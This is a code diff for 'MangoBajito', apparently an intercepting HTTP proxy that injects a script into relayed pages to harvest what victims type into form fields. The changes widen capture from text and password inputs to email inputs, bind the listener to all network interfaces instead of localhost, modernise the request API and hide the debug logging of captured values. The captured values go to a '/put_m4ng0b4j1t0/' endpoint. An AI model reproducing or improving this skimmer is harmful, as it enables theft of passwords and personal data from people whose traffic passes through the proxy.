@@ -59,9 +59,7 @@ http.createServer(function (req, res) {
     return res.end();
   }
 
-  var client = http.createClient(port, host);
-  var httpreq = client.request(req.method, req.url, req.headers);
-  httpreq.on('response', function (response) {
+  var httpreq = http.request({port:port, hostname:host,method:req.method,path:req.url,headers:req.headers}, function (response) {
     var header_sent = false;
     if (/get/i.test(req.method) && response.headers['content-length']) {
       delete response.headers['content-length']
@@ -94,7 +92,7 @@ http.createServer(function (req, res) {
   } else {
     httpreq.end();
   }
-}).listen(PORT, '127.0.0.1');
+}).listen(PORT, '0.0.0.0');
 console.log("* MangoBajito listening on port " + PORT);
 return;
 /* Mango Bajito script after the break */
@@ -111,12 +109,13 @@ function __m4ng0b4j1t0__(){
     var mango=[];
     for (var inp in ins) {
       inp = ins[inp];
-      if (!(inp.type == '' || /^(text|password)$/i.test(inp.type))) continue;
+      if (!(inp.type == '' || /^(email|text|password)$/i.test(inp.type))) continue;
       mango.push(escape(inp.name + '=' + inp.value))
     }
     if (window._mango_.join('') != mango.join('')) {
       if (window._mango_.length) {
-        console.log(mango);
+        ////DEBUG
+        // console.log(mango);
         if (mangotimer) clearTimeout(mangotimer)
         mangotimer = setTimeout(function(){
           ifr.src = '/put_m4ng0b4j1t0/' + window._m4ng0b4j1t0_ + '/' + mango.join(',')
